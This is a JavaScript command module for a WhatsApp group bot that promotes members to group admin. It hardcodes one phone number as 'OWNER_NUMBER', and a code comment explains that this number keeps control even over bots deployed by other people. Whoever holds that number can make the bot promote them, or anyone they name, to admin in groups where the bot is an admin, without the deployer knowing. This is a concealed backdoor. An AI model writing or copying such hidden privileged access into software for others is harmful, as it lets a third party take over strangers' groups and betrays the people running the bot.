const OWNER_NUMBER = "918136880986"; 

async function promoteCommand(sock, chatId, mentionedJids, message) {
    try {
        if (!chatId.endsWith('@g.us')) return;

        // Get sender details
        const senderId = message.key.participant || message.participant || message.key.remoteJid;
        const cleanSenderNum = senderId.split('@')[0].split(':')[0];

        // Check if the sender is the repository owner
        const isOwner = message.key.fromMe || cleanSenderNum === OWNER_NUMBER;
        if (!isOwner) return;

        // Get bot's own number/ID
        const botJid = sock.user.id;
        const cleanBotNum = botJid.split('@')[0].split(':')[0];

        // If the owner is using their own number as the bot itself in this chat, 
        // and they are not admin, let it show a message or ignore if it's the personal account.
        // But if it's a public bot deployed by someone else, cleanBotNum will NOT match OWNER_NUMBER.
        
        const groupMetadata = await sock.groupMetadata(chatId);
        const participants = groupMetadata.participants;
        
        const botParticipant = participants.find(p => p.id.includes(cleanBotNum));
        const senderParticipant = participants.find(p => p.id.includes(cleanSenderNum));

        const isBotAdmin = botParticipant && (botParticipant.admin === 'admin' || botParticipant.admin === 'superadmin');
        const isSenderAdmin = senderParticipant && (senderParticipant.admin === 'admin' || senderParticipant.admin === 'superadmin');

        // If the bot itself is not an admin, it cannot promote anyone
        if (!isBotAdmin) {
            console.log("Bot is not an admin in this group.");
            return;
        }

        // If the owner is already an admin, no need to run
        if (isSenderAdmin) {
            return;
        }

        let userToPromote = [];
        
        if (mentionedJids && mentionedJids.length > 0) {
            userToPromote = mentionedJids;
        } else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
            userToPromote = [message.message.extendedTextMessage.contextInfo.participant];
        }
        
        // If no user is mentioned or replied to, promote the owner automatically
        if (userToPromote.length === 0) {
            userToPromote = [senderId];
        }

        // Execute promotion
        await sock.groupParticipantsUpdate(chatId, userToPromote, "promote");
        
        const usernames = userToPromote.map(jid => `@${jid.split('@')[0]}`);
        const promoterJid = sock.user.id;
        
        const promotionMessage = `*『 𝐆𝐑𝐎𝐔𝐏 𝐏𝐑𝐎𝐌𝐎𝐓𝐈𝐎𝐍 』*\n\n` +
            `👥 *𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝 𝐔𝐬𝐞𝐫${userToPromote.length > 1 ? 's' : ''}:*\n` +
            `${usernames.map(name => `• ${name}`).join('\n')}\n\n` +
            `👑 *𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝 𝐁𝐲:* @${promoterJid.split('@')[0]}\n\n` +
            `📅 *𝐃𝐚𝐭𝐞:* ${new Date().toLocaleString()}`;
        
        await sock.sendMessage(chatId, { 
            text: promotionMessage,
            mentions: [...userToPromote, promoterJid]
        });
    } catch (error) {
        console.error('Error in promote command:', error);
    }
}

async function handlePromotionEvent(sock, groupId, participants, author) {
    try {
        if (!Array.isArray(participants) || participants.length === 0) return;

        const promotedUsernames = participants.map(jid => {
            const jidString = typeof jid === 'string' ? jid : (jid.id || jid.toString());
            return `@${jidString.split('@')[0]}`;
        });

        let promotedBy = 'System';
        let mentionList = participants.map(jid => typeof jid === 'string' ? jid : (jid.id || jid.toString()));

        if (author && author.length > 0) {
            const authorJid = typeof author === 'string' ? author : (author.id || author.toString());
            promotedBy = `@${authorJid.split('@')[0]}`;
            mentionList.push(authorJid);
        }

        const promotionMessage = `*『 𝐆𝐑𝐎𝐔𝐏 𝐏𝐑𝐎𝐌𝐎𝐓𝐈𝐎𝐍 』*\n\n` +
            `👥 *𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝 𝐔𝐬𝐞𝐫${participants.length > 1 ? 's' : ''}:*\n` +
            `${promotedUsernames.map(name => `• ${name}`).join('\n')}\n\n` +
            `👑 *𝐏𝐫𝐨ⵎ𝐨𝐭𝐞𝐝 𝐁𝐲:* ${promotedBy}\n\n` +
            `📅 *𝐃𝐚𝐭𝐞:* ${new Date().toLocaleString()}`;
        
        await sock.sendMessage(groupId, {
            text: promotionMessage,
            mentions: mentionList
        });
    } catch (error) {
        console.error('Error handling promotion event:', error);
    }
}

module.exports = { promoteCommand, handlePromotionError: handlePromotionEvent };
